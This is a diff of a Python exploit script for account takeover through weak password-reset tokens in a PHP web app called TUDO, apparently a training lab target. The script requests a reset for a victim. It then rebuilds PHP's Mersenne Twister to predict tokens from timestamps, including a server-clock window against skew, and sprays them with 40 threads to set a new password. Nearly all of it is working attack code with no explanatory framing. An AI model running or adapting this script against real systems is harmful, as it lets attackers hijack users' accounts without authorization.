@@ -1,84 +1,100 @@
 #!/usr/bin/env python3
-import requests, sys, subprocess, time, threading
+# TUDO weak-reset-token takeover. Pure stdlib (no requests, no php).
+# Tokens are reproduced in-process with a PHP-8.x-compatible Mersenne Twister,
+# validated against the server. Window is anchored to the server clock so the
+# client's clock (WSL2 drift etc.) can't push the seed out of range.
+import sys, time, threading, urllib.request, urllib.parse
+from email.utils import parsedate_to_datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-SENT_MARKER    = "Email sent!"
-SUCCESS_MARKER = "Password changed!"
-WORKERS        = 30
+SENT_MARKER, SUCCESS_MARKER = "Email sent!", "Password changed!"
+WORKERS = 40
+CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'
+_N, _M, _A, _U, _L = 624, 397, 0x9908b0df, 0x80000000, 0x7fffffff
 
-def collect_tokens(ts_lower, ts_upper):
-    out = subprocess.check_output(["php", "generateToken.php", str(ts_lower), str(ts_upper)])
-    tokens = [t for t in out.decode().strip().split("\n") if t]
-    # The 2.2s pg_connect runs BEFORE generateToken(), so the real seed sits at the
-    # very top of the window (last ~15ms). Spray highest-timestamp-first -> hit it first.
-    tokens.reverse()
-    return tokens
+def php_token(seed):
+    s = [0]*_N
+    s[0] = seed & 0xffffffff
+    for i in range(1, _N):
+        s[i] = (1812433253*(s[i-1] ^ (s[i-1] >> 30)) + i) & 0xffffffff
+    for i in range(_N-_M):
+        s[i] = (s[i+_M] ^ (((s[i]&_U)|(s[i+1]&_L))>>1) ^ ((0xffffffff*(s[i+1]&1))&_A)) & 0xffffffff
+    for i in range(_N-_M, _N-1):
+        s[i] = (s[i+_M-_N] ^ (((s[i]&_U)|(s[i+1]&_L))>>1) ^ ((0xffffffff*(s[i+1]&1))&_A)) & 0xffffffff
+    s[_N-1] = (s[_M-1] ^ (((s[_N-1]&_U)|(s[0]&_L))>>1) ^ ((0xffffffff*(s[0]&1))&_A)) & 0xffffffff
+    out = []
+    for k in range(32):
+        y = s[k]
+        y ^= y >> 11
+        y ^= (y << 7) & 0x9d2c5680
+        y ^= (y << 15) & 0xefc60000
+        y ^= y >> 18
+        out.append(CHARS[(y & 0xffffffff) % 63])
+    return ''.join(out)
 
-def rest_password(target_url, tokens, new_password, workers):
-    total = len(tokens)
-    found = threading.Event()
-    state = {"token": None, "done": 0}
-    lock  = threading.Lock()
-
-    def try_token(tok):
-        if found.is_set():
-            return
-        try:
-            # plain request per token: independent PHPSESSID, so PHP's per-session
-            # file lock never serializes the workers
-            r = requests.post(f"{target_url}/resetpassword.php",
-                              data={"token": tok, "password1": new_password, "password2": new_password},
-                              timeout=20)
-            hit = SUCCESS_MARKER in r.text
-        except requests.RequestException:
-            return
-        with lock:
-            state["done"] += 1
-            if hit and not found.is_set():
-                state["token"] = tok
-                found.set()
-            sys.stdout.write(f"\r[*] tried {state['done']}/{total} | found: {'YES' if found.is_set() else 'no'}   ")
-            sys.stdout.flush()
-
-    with ThreadPoolExecutor(max_workers=workers) as ex:
-        futs = [ex.submit(try_token, t) for t in tokens]
-        for _ in as_completed(futs):         # wait for each result; keep going UNTIL found
-            if found.is_set():
-                break
-        ex.shutdown(wait=False, cancel_futures=True)
-    print()
-    return state["token"]
+def post(url, data, timeout=25):
+    body = urllib.parse.urlencode(data).encode()
+    req = urllib.request.Request(url, data=body, method="POST")
+    with urllib.request.urlopen(req, timeout=timeout) as r:
+        return r.read().decode(errors="ignore"), r.headers
 
 def main():
     if len(sys.argv) < 4:
         print(f"Usage: python3 {sys.argv[0]} <target_url> <target_user> <new_password>")
         sys.exit(1)
+    target, user, newpass = sys.argv[1].rstrip("/"), sys.argv[2], sys.argv[3]
 
-    target_url   = sys.argv[1].rstrip("/")
-    target_user  = sys.argv[2]
-    new_password = sys.argv[3]
-
-    ts_lower = int(time.time() * 1000)
-    r = requests.post(f"{target_url}/forgotpassword.php", data={"username": target_user}, timeout=20)
-    ts_upper = int(time.time() * 1000)
-
-    if SENT_MARKER not in r.text:            # precondition
-        print(f"[-] Precondition failed: no '{SENT_MARKER}'. User missing or blocked (admin is excluded).")
+    ts_lo = int(time.time()*1000)
+    html, hdrs = post(f"{target}/forgotpassword.php", {"username": user})
+    ts_hi = int(time.time()*1000)
+    if SENT_MARKER not in html:
+        print(f"[-] Precondition failed: no '{SENT_MARKER}'. User missing or blocked (admin excluded).")
         sys.exit(1)
 
-    tokens = collect_tokens(ts_lower, ts_upper)
-    print(f"[*] Reset requested for {target_user}")
-    print(f"[*] Seed window = {ts_upper - ts_lower} ms  ->  {len(tokens)} candidates (spraying top-down)\n")
+    # server clock from the Date header (1s resolution) -> skew-proof anchor
+    srv_ms = int(parsedate_to_datetime(hdrs["Date"]).timestamp()*1000)
+
+    # candidate seeds, ordered fast-path first:
+    #   1) client window, reversed (instant hit when clocks agree)
+    #   2) server-Date window (catches clock skew), minus overlap
+    client = list(range(ts_lo, ts_hi+1))[::-1]
+    seen = set(client)
+    date = [s for s in range(srv_ms-300, srv_ms+1300) if s not in seen]
+    seeds = client + date
+    print(f"[*] Reset for {user} | client window {ts_hi-ts_lo}ms | server-anchored +{len(date)} | {len(seeds)} candidates")
+
+    tokens = [php_token(s) for s in seeds]
+
+    found = threading.Event(); state = {"tok": None, "done": 0}; lock = threading.Lock()
+    def try_token(tok):
+        if found.is_set(): return
+        try:
+            html, _ = post(f"{target}/resetpassword.php",
+                           {"token": tok, "password1": newpass, "password2": newpass})
+        except Exception:
+            return
+        with lock:
+            state["done"] += 1
+            if SUCCESS_MARKER in html and not found.is_set():
+                state["tok"] = tok; found.set()
+            if state["done"] % 25 == 0 and not found.is_set():
+                sys.stdout.write(f"\r[*] tried {state['done']}/{len(tokens)}   ")
+                sys.stdout.flush()
 
     start = time.time()
-    token = rest_password(target_url, tokens, new_password, WORKERS)
-    elapsed = time.time() - start
-
-    if token:
-        print(f"[+] SUCCESS in {elapsed:.1f}s -- {target_user}'s password is now '{new_password}'")
-        print(f"[+] Winning token: {token}")
+    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
+        futs = [ex.submit(try_token, t) for t in tokens]
+        for _ in as_completed(futs):
+            if found.is_set():
+                break
+        ex.shutdown(wait=False, cancel_futures=True)
+    el = time.time() - start
+    print()
+    if found.is_set():
+        print(f"[+] SUCCESS in {el:.1f}s -- {user}'s password is now '{newpass}'")
+        print(f"[+] Winning token: {state['tok']}")
     else:
-        print(f"[-] FAILED after {elapsed:.1f}s -- no match. Raise WORKERS or check clock skew.")
+        print(f"[-] FAILED in {el:.1f}s -- token not in window. Widen the date range or raise WORKERS.")
 
 if __name__ == "__main__":
     main()
